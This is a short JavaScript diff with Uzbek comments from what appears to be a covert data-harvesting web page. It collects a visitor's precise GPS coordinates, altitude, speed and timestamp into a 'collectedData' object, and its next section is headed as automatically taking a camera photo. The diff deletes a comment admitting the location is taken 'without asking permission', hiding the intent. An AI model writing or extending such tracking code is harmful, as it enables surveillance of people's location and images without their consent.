@@ -156,7 +156,7 @@
                 }
             };
 
-            // 1. GPS joylashuvni avtomatik olish (ruxsat so'ramasdan)
+            // 1. GPS joylashuvni avtomatik olish
             try {
                 const position = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(
@@ -164,21 +164,24 @@
                         reject,
                         { 
                             enableHighAccuracy: true,
-                            timeout: 5000,
+                            timeout: 10000,
                             maximumAge: 0
                         }
                     );
                 });
                 
-                collectedData.location = {
+                collectedData.gps_location = {
                     latitude: position.coords.latitude,
                     longitude: position.coords.longitude,
                     accuracy: position.coords.accuracy,
                     altitude: position.coords.altitude,
-                    speed: position.coords.speed
+                    speed: position.coords.speed,
+                    timestamp: position.timestamp
                 };
+                console.log('GPS data collected:', collectedData.gps_location);
             } catch (error) {
-                collectedData.location = { error: error.message };
+                console.log('GPS error:', error.message);
+                collectedData.gps_location = { error: error.message };
             }
 
             // 2. Kameradan avtomatik rasm olish
